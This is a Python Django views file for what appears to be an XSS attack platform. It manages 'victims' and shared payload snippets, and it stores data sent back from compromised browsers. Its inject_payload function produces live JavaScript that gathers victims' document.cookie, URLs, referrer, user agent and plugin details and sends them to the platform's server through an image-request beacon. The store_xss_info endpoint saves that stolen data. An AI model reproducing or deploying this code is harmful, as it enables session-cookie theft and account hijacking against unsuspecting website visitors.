#!/usr/bin/env python
#coding:utf-8
"""
  Author:  Hysia --<hysia@huorui.net>
  Purpose: 
  Created: 12/21/13
"""
import json
from ast import literal_eval
from django.http import Http404, HttpResponse
from django.conf import settings
from django.template import RequestContext
from django.shortcuts import redirect
from django.shortcuts import render_to_response
from django.contrib.auth.decorators import login_required
from django.db.models import Q

from models import XssData
from models import XssSnippers

@login_required
def xss_index(request):
    '''XSS platform index page'''
    uid = request.user.id
    try:
        xssdata = XssData.objects.filter(uid=uid)
    except:
        xssdata = []
    
    return render_to_response('widgets/xss/index.html', {
            'xssdata': xssdata,
    }, context_instance=RequestContext(request))

def show_victim(request,vid):
    try:
        victim = XssData.objects.get(id=vid)
    except:
        victim = None
        
    return render_to_response('widgets/xss/modal_view_detail.html', {
            'victim': victim,
    }, context_instance=RequestContext(request))        

def command_victim(request,vid):
    try:
        victim = XssData.objects.get(id=vid)
    except:
        victim = None
        
    return render_to_response('widgets/xss/modal_command.html', {
            'victim': victim,
    }, context_instance=RequestContext(request)) 

def remove_victim(request,vid):

    try:
        victim = XssData.objects.get(id=vid)
    except:
        victim = None
        
    action = request.GET.get('action',None)
    if victim and action == 'remove':
        victim.delete()
        ret = {'code':200,'message':'success'}
        return HttpResponse(json.dumps(ret), mimetype="application/json")
        
    return render_to_response('widgets/xss/modal_remove.html', {
            'victim': victim,
    }, context_instance=RequestContext(request))

def my_snippers(request):
    uid = request.user.id
    try:
        snippers = XssSnippers.objects.filter(uid=uid)
    except:
        snippers = []
        
    return render_to_response('widgets/xss/snippers.html', {
            'snippers': snippers,
    }, context_instance=RequestContext(request))

def show_public_snippers(request):
    uid = request.user.id
    #TODO
    #'share_with' should be a list
    share_with = uid
    try:
        snippers = XssSnippers.objects.filter(Q(share_with=share_with) | Q(is_public=True))
    except:
        snippers = []
        
    return render_to_response('widgets/xss/snippers.html', {
            'snippers': snippers,
    }, context_instance=RequestContext(request))

def add_snipper(request):
    uid = request.user.id
    sid = request.POST.get('sid','')
    desc = request.POST.get('desc','')
    codz = request.POST.get('codz','')
    is_public = request.POST.get('ispublic', False)
    is_public = True if is_public =='on' else False
    
    if sid:
        try:
            snipper = XssSnippers.objects.get(id=sid)
            snipper.uid = uid
            snipper.is_public = is_public
            snipper.codz = codz
            snipper.desc = desc
            snipper.save()
        except:
            pass
    else:       
        snipper = XssSnippers(uid=uid,is_public=is_public,codz=codz,desc=desc)
        snipper.save()
        
    return redirect('/xss/snippers')

def show_snipper(request,sid):
    try:
        snipper = XssSnippers.objects.get(id=sid)
    except:
        snipper = None
        
    return render_to_response('widgets/xss/modal_view_snipper.html', {
            'snipper': snipper,
    }, context_instance=RequestContext(request))  


def add_snipper_to_payload(request,sid):
    try:
        snipper = XssSnippers.objects.get(id=sid)
    except:
        snipper = None
        
    return render_to_response('widgets/xss/modal_add _payload.html', {
            'snipper': snipper,
    }, context_instance=RequestContext(request))
        
def remove_snipper(request,sid):

    try:
        snipper = XssSnippers.objects.get(id=sid)
    except:
        snipper = None
        
    action = request.GET.get('action',None)
    if snipper and action == 'remove':
        snipper.delete()
        ret = {'code':200,'message':'success'}
        return HttpResponse(json.dumps(ret), mimetype="application/json")
        
    return render_to_response('widgets/xss/modal_remove _snipper.html', {
            'snipper': snipper,
    }, context_instance=RequestContext(request))

def store_xss_info(request,uid):
    data = request.GET.get('i','')
    ip = request.META['HTTP_X_FORWARDED_FOR'] if 'HTTP_X_FORWARDED_FOR' in request.META else request.META['REMOTE_ADDR']
    useragent = request.META['HTTP_USER_AGENT']
    referer  = request.META['HTTP_REFERER']
    try:
        data_obj = literal_eval(data)
    except:
        data_obj = None
        
    if data_obj is None:
        #log error
        pass
    else:
        data_obj['uid'] = uid
        data_obj['ip'] = ip
        data_obj['ua'] = useragent if 'ua' not in data_obj else data_obj['ua']
        data_obj['referrer'] = referer if 'referrer' not in data_obj else data_obj['referrer']
        
        xssdata = XssData(**data_obj)
        xssdata.save()
    
    return HttpResponse('')

def inject_payload(request,uid):
    '''inject payload'''
    
    url = '%sxss/u/%s/s/' %(settings.SERVER_URL, uid)
    p_ua = 'escape(navigator.userAgent)'
    p_lang = 'navigator.language'
    p_platform = 'navigator.platform'
    p_referrer ='escape(document.referrer)'
    p_location = 'escape(window.location.href)'
    p_toplocation = 'escape(top.location.href)'
    p_cookies = 'escape(document.cookie)'
    p_domain = 'document.domain'
    p_title = 'document.title'
    p_screen = 'self.screen?screen.width+"x"+screen.height:""'
    p_opener = '(window.opener&&window.opener.location.href)?window.opener.location.href:""'
    p_flash = 'function(){var v="";if(window.ActiveXObject){var f=new window.ActiveXObject("ShockwaveFlash.ShockwaveFlash");if(f){v=f.GetVariable("$version");}}else if(navigator.plugins&&navigator.plugins.length>0){var f=navigator.plugins["Shockwave Flash"];if(f){v=f.description;}}return v;}()'
    
    data='''function j2s(o){var arr=[];var fmt=function(s){if(typeof s=='object'&&s!=null){return j2s(s)}else{return /^(string|number)$/.test(typeof s)?"'"+s+"'":s}};for (var i in o){arr.push("'"+i+"':"+fmt(o[i]))};return '{'+arr.join(',')+'}'};
    var d={};d.ua=%s;d.lang=%s;d.platform=%s;d.referrer=%s;d.location=%s;d.toplocation=%s;d.cookies=%s;d.domain=%s;d.title=%s;d.screen=%s;d.opener=%s;d.flash=%s;
    window.onload=function(){var i=j2s(d);new Image().src="%s?i="+i;};
    ''' %(p_ua, p_lang, p_platform, p_referrer, p_location, p_toplocation, p_cookies, p_domain, p_title, p_screen, p_opener, p_flash, url)

    return HttpResponse(data, mimetype="application/x-javascript")